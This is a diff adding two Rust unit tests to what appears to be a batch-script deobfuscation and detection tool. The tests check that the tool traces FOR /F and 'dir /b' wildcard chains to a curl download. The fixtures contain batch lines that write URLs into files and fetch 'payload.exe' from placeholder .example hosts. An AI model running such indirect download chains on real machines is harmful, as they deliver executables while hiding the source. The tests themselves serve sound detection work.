@@ -3767,6 +3767,64 @@ for /f "tokens=* delims=" %%F in ('dir /b url.txt') do for /f "tokens=* delims="
     }
 
     #[test]
+    fn for_f_dir_b_wildcard_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.log
+echo https://for-f-dir-b-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('dir /b *.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b wildcard source did not discover generated file for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_dir_b_path_wildcard_discovers_direct_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-dir-b-path-wildcard.example/payload.exe>C:\Work\url.txt
+echo https://for-f-dir-b-path-wildcard-wrong.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('dir /b C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type C:\Work\%%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-b-path-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /b path wildcard source did not discover direct generated file: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://for-f-dir-b-path-wildcard-wrong.example/payload.exe"
+                )
+            }),
+            "FOR /F dir /b path wildcard matched nested generated file: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_cmd_c_type_reads_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
